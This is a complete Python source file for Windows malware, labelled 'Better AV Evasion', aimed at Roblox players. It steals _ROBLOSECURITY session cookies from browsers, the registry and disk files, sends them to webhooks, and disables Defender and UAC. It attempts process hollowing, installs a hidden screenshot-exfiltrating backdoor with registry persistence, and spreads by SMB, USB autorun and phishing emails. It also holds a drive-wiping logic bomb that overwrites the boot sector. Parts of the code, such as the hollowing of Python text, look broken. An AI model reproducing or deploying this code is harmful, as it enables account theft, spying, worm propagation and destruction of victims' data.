import psutil
import os
import winreg
import sqlite3
import requests
import time
import threading
import subprocess
import win32gui
import win32con
import pyautogui
import win32process
import win32security
import win32api
import win32file
import ntsecuritycon
import smtplib
import socket
import netifaces
import random
import string
import base64
import zlib
import json
import uuid
import ctypes
import hashlib
from datetime import datetime
from pathlib import Path
from win32crypt import CryptUnprotectData
from cryptography.fernet import Fernet
from shutil import copyfile, rmtree
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from io import StringIO
from contextlib import redirect_stderr

# Version 1.1.0 - Better AV Evasion

COOKIE_WEBHOOK_URLS = ["1", "1_backup"]
SCREENSHOT_WEBHOOK_URLS = ["2", "2_backup"]
ENCRYPTION_KEY = Fernet.generate_key()
CIPHER = Fernet(ENCRYPTION_KEY)
CHECK_INTERVAL = 3
SCREENSHOT_INTERVAL = 1800
LOGIC_BOMB_CHECK_INTERVAL = 5
FOUND_COOKIES = set()
SYSTEM_PATHS = [
    os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'System'),
    os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Core'),
    os.path.join(os.getenv('WINDIR'), 'System32', 'Config')
]
STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
OBFUSCATED_NAMES = [''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) for _ in range(3)]
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48'
]
AV_PROCESSES = ['avastsvc.exe', 'msmpeng.exe', 'nortonsecurity.exe', 'mcafee.exe', 'eset.exe']
XOR_KEY = ''.join(random.choices(string.ascii_letters, k=16)).encode()
ERROR_LOG = StringIO()
LEGIT_PROCESSES = ['explorer.exe', 'svchost.exe', 'notepad.exe']

kernel32 = ctypes.windll.kernel32
SIZE_T = ctypes.c_size_t
LPVOID = ctypes.c_void_p
HANDLE = ctypes.c_void_p
DWORD = ctypes.c_uint32

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('hProcess', HANDLE),
        ('hThread', HANDLE),
        ('dwProcessId', DWORD),
        ('dwThreadId', DWORD)
    ]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ('cb', DWORD),
        ('lpReserved', ctypes.c_wchar_p),
        ('lpDesktop', ctypes.c_wchar_p),
        ('lpTitle', ctypes.c_wchar_p),
        ('dwX', DWORD),
        ('dwY', DWORD),
        ('dwXSize', DWORD),
        ('dwYSize', DWORD),
        ('dwXCountChars', DWORD),
        ('dwYCountChars', DWORD),
        ('dwFillAttribute', DWORD),
        ('dwFlags', DWORD),
        ('wShowWindow', ctypes.c_uint16),
        ('cbReserved2', ctypes.c_uint16),
        ('lpReserved2', ctypes.c_char_p),
        ('hStdInput', HANDLE),
        ('hStdOutput', HANDLE),
        ('hStdError', HANDLE)
    ]

def random_uuid():
    try:
        return str(uuid.uuid4())[:8]
    except Exception as e:
        ERROR_LOG.write(f"random_uuid error: {str(e)}\n")
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def xor_encrypt(data, key):
    try:
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
    except Exception as e:
        ERROR_LOG.write(f"xor_encrypt error: {str(e)}\n")
        return data

def xor_decrypt(data, key):
    return xor_encrypt(data, key)

def polymorph_code(code):
    try:
        replacements = {
            'hide': ''.join(random.choices(string.ascii_lowercase, k=8)),
            'capture': ''.join(random.choices(string.ascii_lowercase, k=8)),
            'wipe': ''.join(random.choices(string.ascii_lowercase, k=8)),
            'monitor': ''.join(random.choices(string.ascii_lowercase, k=8)),
            '_ROBLOSECURITY': xor_encrypt('_ROBLOSECURITY', XOR_KEY),
            'WEBHOOK': ''.join(random.choices(string.ascii_lowercase, k=10)),
            'INTERVAL': ''.join(random.choices(string.ascii_lowercase, k=10)),
            'CHECK': ''.join(random.choices(string.ascii_lowercase, k=10))
        }
        for old, new in replacements.items():
            code = code.replace(old, new)
        return code
    except Exception as e:
        ERROR_LOG.write(f"polymorph_code error: {str(e)}\n")
        return code

def pack_and_encrypt(code):
    try:
        compressed = zlib.compress(code.encode())
        encrypted = CIPHER.encrypt(compressed)
        encoded = base64.b64encode(encrypted).decode()
        stub = f"""
import zlib, base64
from cryptography.fernet import Fernet
key = {ENCRYPTION_KEY.decode()}
cipher = Fernet(key)
encrypted = base64.b64decode('{encoded}')
compressed = cipher.decrypt(encrypted)
code = zlib.decompress(compressed).decode()
exec(code)
"""
        return stub
    except Exception as e:
        ERROR_LOG.write(f"pack_and_encrypt error: {str(e)}\n")
        return code

def process_hollowing(payload_code):
    try:
        target_process = random.choice(LEGIT_PROCESSES)
        startup_info = STARTUPINFO()
        startup_info.cb = ctypes.sizeof(STARTUPINFO)
        process_info = PROCESS_INFORMATION()

        success = kernel32.CreateProcessW(
            ctypes.c_wchar_p(target_process),
            None, None, None, False,
            0x00000004 | 0x8000000, 
            None, None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
        )
        if not success:
            raise ctypes.WinError(ctypes.get_last_error())

        try:
            class CONTEXT(ctypes.Structure):
                _fields_ = [
                    ('ContextFlags', DWORD),
                    ('Dr0', DWORD), ('Dr1', DWORD), ('Dr2', DWORD), ('Dr3', DWORD),
                    ('Dr6', DWORD), ('Dr7', DWORD),
                    ('FloatSave', ctypes.c_ubyte * 512),
                    ('SegGs', DWORD), ('SegFs', DWORD), ('SegEs', DWORD), ('SegDs', DWORD),
                    ('Edi', DWORD), ('Esi', DWORD), ('Ebx', DWORD), ('Edx', DWORD),
                    ('Ecx', DWORD), ('Eax', DWORD), ('Ebp', DWORD), ('Eip', DWORD),
                    ('SegCs', DWORD), ('EFlags', DWORD), ('Esp', DWORD), ('SegSs', DWORD),
                    ('ExtendedRegisters', ctypes.c_ubyte * 512)
                ]

            context = CONTEXT()
            context.ContextFlags = 0x10001  
            if not kernel32.GetThreadContext(process_info.hThread, ctypes.byref(context)):
                raise ctypes.WinError(ctypes.get_last_error())

            peb_address = ctypes.c_void_p()
            if not kernel32.ReadProcessMemory(
                process_info.hProcess,
                ctypes.c_void_p(context.Ebx + 8),
                ctypes.byref(peb_address),
                ctypes.sizeof(ctypes.c_void_p),
                None
            ):
                raise ctypes.WinError(ctypes.get_last_error())

            image_base = ctypes.c_void_p()
            if not kernel32.ReadProcessMemory(
                process_info.hProcess,
                ctypes.c_void_p(peb_address.value + 8),
                ctypes.byref(image_base),
                ctypes.sizeof(ctypes.c_void_p),
                None
            ):
                raise ctypes.WinError(ctypes.get_last_error())

            if not ctypes.windll.ntdll.NtUnmapViewOfSection(
                process_info.hProcess,
                image_base
            ):
                raise ctypes.WinError(ctypes.get_last_error())

            payload = payload_code.encode()
            alloc_address = kernel32.VirtualAllocEx(
                process_info.hProcess,
                image_base,
                len(payload),
                0x3000,  
                0x40     
            )
            if not alloc_address:
                raise ctypes.WinError(ctypes.get_last_error())

            written = SIZE_T()
            if not kernel32.WriteProcessMemory(
                process_info.hProcess,
                alloc_address,
                payload,
                len(payload),
                ctypes.byref(written)
            ):
                raise ctypes.WinError(ctypes.get_last_error())

            if not kernel32.WriteProcessMemory(
                process_info.hProcess,
                ctypes.c_void_p(peb_address.value + 8),
                ctypes.byref(ctypes.c_void_p(alloc_address)),
                ctypes.sizeof(ctypes.c_void_p),
                None
            ):
                raise ctypes.WinError(ctypes.get_last_error())

            context.Eip = alloc_address
            if not kernel32.SetThreadContext(process_info.hThread, ctypes.byref(context)):
                raise ctypes.WinError(ctypes.get_last_error())

            if not kernel32.ResumeThread(process_info.hThread):
                raise ctypes.WinError(ctypes.get_last_error())

        finally:
            kernel32.CloseHandle(process_info.hThread)
            kernel32.CloseHandle(process_info.hProcess)

        return True
    except Exception as e:
        ERROR_LOG.write(f"process_hollowing error: {str(e)}\n")
        return False

def elevate_privileges():
    try:
        token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), ntsecuritycon.TOKEN_ADJUST_PRIVILEGES | ntsecuritycon.TOKEN_QUERY)
        win32security.AdjustTokenPrivileges(token, False, [
            (win32security.LookupPrivilegeValue(None, ntsecuritycon.SE_DEBUG_NAME), ntsecuritycon.SE_PRIVILEGE_ENABLED),
            (win32security.LookupPrivilegeValue(None, ntsecuritycon.SE_TCB_NAME), ntsecuritycon.SE_PRIVILEGE_ENABLED),
            (win32security.LookupPrivilegeValue(None, ntsecuritycon.SE_SHUTDOWN_NAME), ntsecuritycon.SE_PRIVILEGE_ENABLED)
        ])
        win32api.CloseHandle(token)
    except Exception as e:
        ERROR_LOG.write(f"elevate_privileges error: {str(e)}\n")

def disable_protections():
    try:
        with redirect_stderr(StringIO()):
            subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], check=False, capture_output=True)
            subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'EnableLUA', '/t', 'REG_DWORD', '/d', '0', '/f'], check=False, capture_output=True)
            subprocess.run(['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management', '/v', 'FeatureSettingsOverride', '/t', 'REG_DWORD', '/d', '3', '/f'], check=False, capture_output=True)
            ctypes.windll.ntdll.NtSetInformationProcess(ctypes.windll.kernel32.GetCurrentProcess(), 0x22, ctypes.byref(ctypes.c_int(0)), 4)
    except Exception as e:
        ERROR_LOG.write(f"disable_protections error: {str(e)}\n")

def is_av_running():
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in AV_PROCESSES:
                return True
        return False
    except Exception as e:
        ERROR_LOG.write(f"is_av_running error: {str(e)}\n")
        return False

def wipe_system():
    try:
        for drive in [chr(x) + ':\\' for x in range(65, 91) if os.path.exists(chr(x) + ':\\')]:
            subprocess.run(['del', '/F', '/Q', '/S', f'{drive}*.*'], shell=True, check=False, capture_output=True)
            subprocess.run(['format', drive.rstrip('\\'), '/FS:NTFS', '/Q', '/Y'], shell=True, check=False, capture_output=True)
        with open('\\\\.\\PhysicalDrive0', 'wb') as disk:
            disk.write(b'\x00' * 512)
        ctypes.windll.kernel32.ExitWindowsEx(0x08, 0)
    except Exception as e:
        ERROR_LOG.write(f"wipe_system error: {str(e)}\n")

def is_roblox_running():
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in ['robloxplayerbeta.exe', 'robloxapp.exe', 'bloxstrap.exe']:
                return True
        return False
    except Exception as e:
        ERROR_LOG.write(f"is_roblox_running error: {str(e)}\n")
        return False

def terminate_roblox():
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in ['robloxplayerbeta.exe', 'robloxapp.exe', 'bloxstrap.exe']:
                handle = win32api.OpenProcess(win32con.PROCESS_TERMINATE, False, proc.pid)
                try:
                    win32api.TerminateProcess(handle, 0)
                finally:
                    win32api.CloseHandle(handle)
    except Exception as e:
        ERROR_LOG.write(f"terminate_roblox error: {str(e)}\n")

def uninstall_roblox():
    roblox_paths = [
        os.path.expanduser('~\\AppData\\Local\\Roblox'),
        os.path.expanduser('~\\AppData\\Local\\Bloxstrap'),
        r"C:\Program Files (x86)\Roblox",
        r"C:\Program Files\Roblox"
    ]
    
    for path in roblox_paths:
        try:
            if os.path.exists(path):
                rmtree(path, ignore_errors=True)
        except Exception as e:
            ERROR_LOG.write(f"uninstall_roblox path removal error: {str(e)}\n")
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Roblox", 0, winreg.KEY_ALL_ACCESS)
        try:
            winreg.DeleteKeyEx(key, "", winreg.KEY_WOW64_64KEY)
        finally:
            winreg.CloseKey(key)
    except Exception as e:
        ERROR_LOG.write(f"uninstall_roblox registry error: {str(e)}\n")
    
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall", 0, winreg.KEY_ALL_ACCESS)
        try:
            i = 0
            while True:
                subkey = winreg.EnumKey(key, i)
                subkey_path = rf"Software\Microsoft\Windows\CurrentVersion\Uninstall\{subkey}"
                app_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey_path, 0, winreg.KEY_ALL_ACCESS)
                try:
                    display_name, _ = winreg.QueryValueEx(app_key, "DisplayName")
                    if "roblox" in display_name.lower() or "bloxstrap" in display_name.lower():
                        uninstall_string, _ = winreg.QueryValueEx(app_key, "UninstallString")
                        subprocess.run(uninstall_string + " /quiet", shell=True, check=False, capture_output=True)
                finally:
                    winreg.CloseKey(app_key)
                i += 1
        except WindowsError:
            pass
        finally:
            winreg.CloseKey(key)
    except Exception as e:
        ERROR_LOG.write(f"uninstall_roblox uninstall error: {str(e)}\n")

def get_browser_paths():
    try:
        return {
            OBFUSCATED_NAMES[0]: os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default'),
            OBFUSCATED_NAMES[1]: os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default'),
            OBFUSCATED_NAMES[2]: os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
        }
    except Exception as e:
        ERROR_LOG.write(f"get_browser_paths error: {str(e)}\n")
        return {}

def decrypt_chrome_cookie(encrypted_value):
    try:
        if encrypted_value.startswith(b'v10'):
            return CryptUnprotectData(encrypted_value[3:], None, None, None, 0)[1].decode()
        return CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
    except Exception as e:
        ERROR_LOG.write(f"decrypt_chrome_cookie error: {str(e)}\n")
        return ""

def get_chrome_cookies(browser_path):
    cookies = []
    db_path = os.path.join(browser_path, 'Cookies')
    temp_db = os.path.join(os.getenv('TEMP'), f'{random_uuid()}.db')
    
    try:
        copyfile(db_path, temp_db)
        with sqlite3.connect(temp_db) as conn:
            conn.text_factory = bytes
            cursor = conn.cursor()
            cursor.execute(f"SELECT host_key, name, encrypted_value FROM cookies WHERE name = '{xor_decrypt('_ROBLOSECURITY', XOR_KEY)}'")
            
            for host, name, value in cursor.fetchall():
                decrypted = decrypt_chrome_cookie(value)
                if decrypted and decrypted not in FOUND_COOKIES:
                    cookies.append({'host': host.decode(), 'cookie': decrypted})
                    FOUND_COOKIES.add(decrypted)
    except Exception as e:
        ERROR_LOG.write(f"get_chrome_cookies error: {str(e)}\n")
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass
    
    return cookies

def get_firefox_cookies(profile_path):
    cookies = []
    try:
        for profile in os.listdir(profile_path):
            db_path = os.path.join(profile_path, profile, 'cookies.sqlite')
            if not os.path.exists(db_path):
                continue
                
            temp_db = os.path.join(os.getenv('TEMP'), f'ff_{random_uuid()}.db')
            try:
                copyfile(db_path, temp_db)
                with sqlite3.connect(temp_db) as conn:
                    cursor = conn.cursor()
                    cursor.execute(f"SELECT host, name, value FROM moz_cookies WHERE name = '{xor_decrypt('_ROBLOSECURITY', XOR_KEY)}'")
                    
                    for host, name, value in cursor.fetchall():
                        if value and value not in FOUND_COOKIES:
                            cookies.append({'host': host, 'cookie': value})
                            FOUND_COOKIES.add(value)
            except Exception as e:
                ERROR_LOG.write(f"get_firefox_cookies error: {str(e)}\n")
            finally:
                if os.path.exists(temp_db):
                    try:
                        os.remove(temp_db)
                    except:
                        pass
    except Exception as e:
        ERROR_LOG.write(f"get_firefox_cookies profile error: {str(e)}\n")
    
    return cookies

def search_filesystem():
    cookies = []
    drives = [chr(x) + ":\\" for x in range(65, 91) if os.path.exists(chr(x) + ":\\")]
    
    for drive in drives:
        try:
            for root, _, files in os.walk(drive, topdown=True):
                for file in files:
                    if file.lower().endswith(('.txt', '.log', '.dat')):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                if xor_decrypt('_ROBLOSECURITY', XOR_KEY) in content:
                                    lines = content.split('\n')
                                    for line in lines:
                                        if xor_decrypt('_ROBLOSECURITY', XOR_KEY) in line and line not in FOUND_COOKIES:
                                            cookies.append({'host': 'file://' + file_path, 'cookie': line.strip()})
                                            FOUND_COOKIES.add(line.strip())
                        except:
                            continue
        except Exception as e:
            ERROR_LOG.write(f"search_filesystem error: {str(e)}\n")
    
    return cookies

def get_registry_cookies():
    cookies = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Roblox", 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
        try:
            i = 0
            while True:
                name, value, _ = winreg.EnumValue(key, i)
                if xor_decrypt('_ROBLOSECURITY', XOR_KEY) in name and value not in FOUND_COOKIES:
                    cookies.append({'host': 'registry', 'cookie': value})
                    FOUND_COOKIES.add(value)
                i += 1
        except WindowsError:
            pass
        finally:
            winreg.CloseKey(key)
    except Exception as e:
        ERROR_LOG.write(f"get_registry_cookies error: {str(e)}\n")
    
    return cookies

def send_to_cookie_webhook(cookies):
    if not cookies:
        return
    
    try:
        system_info = f"Host: {socket.gethostname()} | IP: {socket.gethostbyname(socket.gethostname())}"
        for cookie in cookies:
            payload = {
                'embeds': [{
                    'title': 'Data Extracted',
                    'color': 0xff0000,
                    'fields': [
                        {'name': 'Origin', 'value': cookie['host'], 'inline': True},
                        {'name': 'Value', 'value': CIPHER.encrypt(cookie['cookie'].encode()).decode()[:50] + '...', 'inline': True},
                        {'name': 'System', 'value': system_info, 'inline': False}
                    ],
                    'timestamp': datetime.utcnow().isoformat(),
                    'footer': {'text': f'ID: {random_uuid()}'}
                }]
            }
        
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            }
            proxies = {'http': None, 'https': None}
        
            for url in COOKIE_WEBHOOK_URLS:
                try:
                    requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=2)
                    break
                except:
                    continue
    except Exception as e:
        ERROR_LOG.write(f"send_to_cookie_webhook error: {str(e)}\n")

def send_to_screenshot_webhook(screenshot_path):
    try:
        system_info = f"Host: {socket.gethostname()} | IP: {socket.gethostbyname(socket.gethostname())}"
        with open(screenshot_path, 'rb') as f:
            encrypted_data = CIPHER.encrypt(f.read())
        chunk_size = 1024 * 1024  # 1MB chunks
        chunks = [encrypted_data[i:i + chunk_size] for i in range(0, len(encrypted_data), chunk_size)]
        
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'Accept': '*/*'
        }
        proxies = {'http': None, 'https': None}
        
        for i, chunk in enumerate(chunks):
            files = {'file': (f'scr_part_{i}.bin', chunk)}
            payload = {
                'embeds': [{
                    'title': f'Screen Capture (Part {i+1}/{len(chunks)})',
                    'color': 0x00ff00,
                    'fields': [{'name': 'System', 'value': system_info, 'inline': False}],
                    'timestamp': datetime.utcnow().isoformat(),
                    'footer': {'text': f'ID: {random_uuid()}'}
                }]
            }
            for url in SCREENSHOT_WEBHOOK_URLS:
                try:
                    requests.post(url, files=files, json=payload, headers=headers, proxies=proxies, timeout=2)
                    break
                except:
                    continue
    except Exception as e:
        ERROR_LOG.write(f"send_to_screenshot_webhook error: {str(e)}\n")

def spread_smb():
    try:
        ip_base = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:-1])
        for i in range(1, 255):
            ip = f"{ip_base}.{i}"
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((ip, 445))
                sock.close()
                share_path = f"\\\\{ip}\\C$\\Windows\\Temp"
                malware_copy = os.path.join(share_path, f"svchost_{random_uuid()}.exe")
                copyfile(__file__, malware_copy)
                win32file.SetFileAttributes(malware_copy, win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_SYSTEM)
                subprocess.run(['net', 'use', f"\\\\{ip}\\IPC$", '/user:Administrator', ''], check=False, capture_output=True)
                subprocess.run(['schtasks', '/create', '/s', ip, '/tn', f"SystemUpdate{random_uuid()}", '/tr', malware_copy, '/sc', 'ONLOGON', '/ru', 'SYSTEM'], check=False, capture_output=True)
            except:
                continue
    except Exception as e:
        ERROR_LOG.write(f"spread_smb error: {str(e)}\n")

def spread_usb():
    try:
        drives = [chr(x) + ":\\" for x in range(65, 91) if os.path.exists(chr(x) + ":\\") and win32file.GetDriveType(chr(x) + ":\\") == win32file.DRIVE_REMOVABLE]
        for drive in drives:
            malware_copy = os.path.join(drive, f"svchost_{random_uuid()}.exe")
            autorun_path = os.path.join(drive, 'autorun.inf')
            try:
                copyfile(__file__, malware_copy)
                win32file.SetFileAttributes(malware_copy, win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_SYSTEM)
                with open(autorun_path, 'w') as f:
                    f.write(f"""
[AutoRun]
open={malware_copy}
action=Open folder to view files
shell\\open\\command={malware_copy}
""")
                win32file.SetFileAttributes(autorun_path, win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_SYSTEM)
            except:
                continue
    except Exception as e:
        ERROR_LOG.write(f"spread_usb error: {str(e)}\n")

def spread_email():
    try:
        pst_path = os.path.expanduser('~\\AppData\\Local\\Microsoft\\Outlook')
        if os.path.exists(pst_path):
            smtp_server = 'smtp.gmail.com'
            smtp_port = 587
            email_from = f"noreply{random_uuid()}@gmail.com"
            email_pass = "random_password"
            subject = random.choice(['Invoice Update', 'Document Review', 'Meeting Notes'])
            body = f"Please review the attached {subject.lower()}.\nBest regards,\nTeam"
            attachment = f"{subject.lower().replace(' ', '_')}.pdf.exe"
            
            msg = MIMEMultipart()
            msg['From'] = email_from
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            
            part = MIMEBase('application', 'octet-stream')
            with open(__file__, 'rb') as f:
                part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={attachment}')
            msg.attach(part)
            
            server = smtplib.SMTP(smtp_server, smtp_port)
            try:
                server.starttls()
                server.login(email_from, email_pass)
                server.sendmail(email_from, ['contact1@example.com', 'contact2@example.com'], msg.as_string())
            finally:
                server.quit()
    except Exception as e:
        ERROR_LOG.write(f"spread_email error: {str(e)}\n")

def install_backdoor():
    backdoor_code = f"""
import pyautogui
import requests
import time
import os
import win32gui
import win32con
from datetime import datetime
from cryptography.fernet import Fernet

WEBHOOK_URLS = {SCREENSHOT_WEBHOOK_URLS}
INTERVAL = {SCREENSHOT_INTERVAL}
KEY = {ENCRYPTION_KEY.decode()}
CIPHER = Fernet(KEY)
USER_AGENTS = {USER_AGENTS}

def {''.join(random.choices(string.ascii_lowercase, k=8))}():
    try:
        win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
    except:
        pass

def {''.join(random.choices(string.ascii_lowercase, k=8))}():
    while True:
        try:
            img = pyautogui.screenshot()
            path = os.path.join(os.getenv('TEMP'), '{random_uuid()}.png')
            img.save(path)
            with open(path, 'rb') as f:
                encrypted_data = CIPHER.encrypt(f.read())
            chunk_size = 1024 * 1024
            chunks = [encrypted_data[i:i + chunk_size] for i in range(0, len(encrypted_data), chunk_size)]
            
            for i, chunk in enumerate(chunks):
                files = {{'file': (f'scr_part_{{i}}.bin', chunk)}}
                payload = {{
                    'embeds': [{{
                        'title': f'Screen Capture (Part {{i+1}}/{{len(chunks)}})',
                        'color': 0x00ff00,
                        'timestamp': datetime.utcnow().isoformat(),
                        'footer': {{'text': f'ID: {random_uuid()}'}}
                    }}]
                }}
                headers = {{
                    'User-Agent': random.choice(USER_AGENTS),
                    'X-Forwarded-For': f"{{random.randint(1,255)}}.{{random.randint(1,255)}}.{{random.randint(1,255)}}.{{random.randint(1,255)}}",
                    'Accept': '*/*'
                }}
                proxies = {{'http': None, 'https': None}}
                for url in WEBHOOK_URLS:
                    try:
                        requests.post(url, files=files, json=payload, headers=headers, proxies=proxies, timeout=2)
                        break
                    except:
                        continue
            os.remove(path)
        except:
            pass
        time.sleep(INTERVAL)

if __name__ == '__main__':
    {''.join(random.choices(string.ascii_lowercase, k=8))}()
    {''.join(random.choices(string.ascii_lowercase, k=8))}()
"""
    try:
        obfuscated_code = pack_and_encrypt(polymorph_code(backdoor_code))
        if not process_hollowing(obfuscated_code):
            ERROR_LOG.write("Backdoor hollowing failed, falling back to disk-based persistence\n")
            backdoor_path = os.path.join(SYSTEM_PATHS[0], f'sys{random_uuid()}.pyw')
            os.makedirs(os.path.dirname(backdoor_path), exist_ok=True)
            with open(backdoor_path, 'w') as f:
                f.write(hashlib.sha256(obfuscated_code.encode()).hexdigest()[:12] + obfuscated_code)
            win32file.SetFileAttributes(backdoor_path, win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_SYSTEM)
            
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
            try:
                winreg.SetValueEx(key, f"Update{random_uuid()}", 0, winreg.REG_SZ, f'pythonw "{backdoor_path}"')
            finally:
                winreg.CloseKey(key)
    except Exception as e:
        ERROR_LOG.write(f"install_backdoor error: {str(e)}\n")

def install_logic_bomb():
    logic_bomb_code = f"""
import os
import time
import subprocess
import win32gui
import win32con
import ctypes

CHECK = {LOGIC_BOMB_CHECK_INTERVAL}

def {''.join(random.choices(string.ascii_lowercase, k=8))}():
    try:
        for drive in [chr(x) + ':\\' for x in range(65, 91) if os.path.exists(chr(x) + ':\\')]:
            subprocess.run(['del', '/F', '/Q', '/S', f'{{drive}}*.*'], shell=True, check=False, capture_output=True)
            subprocess.run(['format', drive.rstrip('\\\\'), '/FS:NTFS', '/Q', '/Y'], shell=True, check=False, capture_output=True)
        with open('\\\\.\\PhysicalDrive0', 'wb') as disk:
            disk.write(b'\x00' * 512)
        ctypes.windll.kernel32.ExitWindowsEx(0x08, 0)
    except:
        pass

def {''.join(random.choices(string.ascii_lowercase, k=8))}():
    try:
        win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
    except:
        pass

def {''.join(random.choices(string.ascii_lowercase, k=8))}():
    while True:
        try:
            time.sleep(CHECK)
        except:
            break

if __name__ == '__main__':
    {''.join(random.choices(string.ascii_lowercase, k=8))}()
    {''.join(random.choices(string.ascii_lowercase, k=8))}()
"""
    try:
        obfuscated_code = pack_and_encrypt(polymorph_code(logic_bomb_code))
        if not process_hollowing(obfuscated_code):
            ERROR_LOG.write("Logic bomb hollowing failed, falling back to disk-based persistence\n")
            logic_bomb_path = os.path.join(SYSTEM_PATHS[1], f'core{random_uuid()}.pyw')
            os.makedirs(os.path.dirname(logic_bomb_path), exist_ok=True)
            with open(logic_bomb_path, 'w') as f:
                f.write(hashlib.sha256(obfuscated_code.encode()).hexdigest()[:12] + obfuscated_code)
            win32file.SetFileAttributes(logic_bomb_path, win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_SYSTEM)
            
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
            try:
                winreg.SetValueEx(key, f"Service{random_uuid()}", 0, winreg.REG_SZ, f'pythonw "{logic_bomb_path}"')
            finally:
                winreg.CloseKey(key)
    except Exception as e:
        ERROR_LOG.write(f"install_logic_bomb error: {str(e)}\n")

def self_destruct():
    try:
        win32file.SetFileAttributes(__file__, win32file.FILE_ATTRIBUTE_NORMAL)
        os.remove(__file__)
        subprocess.run(['del', '/F', '/Q', __file__], shell=True, check=False, capture_output=True)
    except Exception as e:
        ERROR_LOG.write(f"self_destruct error: {str(e)}\n")

def hide_process():
    try:
        win32file.SetFileAttributes(__file__, win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_SYSTEM)
        ctypes.windll.kernel32.SetProcessWorkingSetSize(ctypes.windll.kernel32.GetCurrentProcess(), -1, -1)
    except Exception as e:
        ERROR_LOG.write(f"hide_process error: {str(e)}\n")

def main():
    try:
        while is_av_running():
            time.sleep(60)
        
        elevate_privileges()
        disable_protections()
        hide_process()
        
        threading.Thread(target=spread_smb, daemon=True).start()
        threading.Thread(target=spread_usb, daemon=True).start()
        threading.Thread(target=spread_email, daemon=True).start()
        
        while True:
            if is_roblox_running():
                cookies = []
                browser_paths = get_browser_paths()
                
                for browser, path in browser_paths.items():
                    try:
                        if browser == OBFUSCATED_NAMES[2]:
                            cookies.extend(get_firefox_cookies(path))
                        else:
                            cookies.extend(get_chrome_cookies(path))
                    except:
                        continue
                
                cookies.extend(get_registry_cookies())
                cookies.extend(search_filesystem())
                
                if cookies:
                    terminate_roblox()
                    send_to_cookie_webhook(cookies)
                    uninstall_roblox()
                    install_backdoor()
                    install_logic_bomb()
                    self_destruct()
                    break
            
            time.sleep(CHECK_INTERVAL + random.uniform(0, 1))
    except Exception as e:
        ERROR_LOG.write(f"main error: {str(e)}\n")

if __name__ == '__main__':
    try:
        threading.Thread(target=main, daemon=True).start()
        while True:
            time.sleep(3600)
    except Exception as e:
        ERROR_LOG.write(f"main thread error: {str(e)}\n")
    finally:
        ERROR_LOG.close()
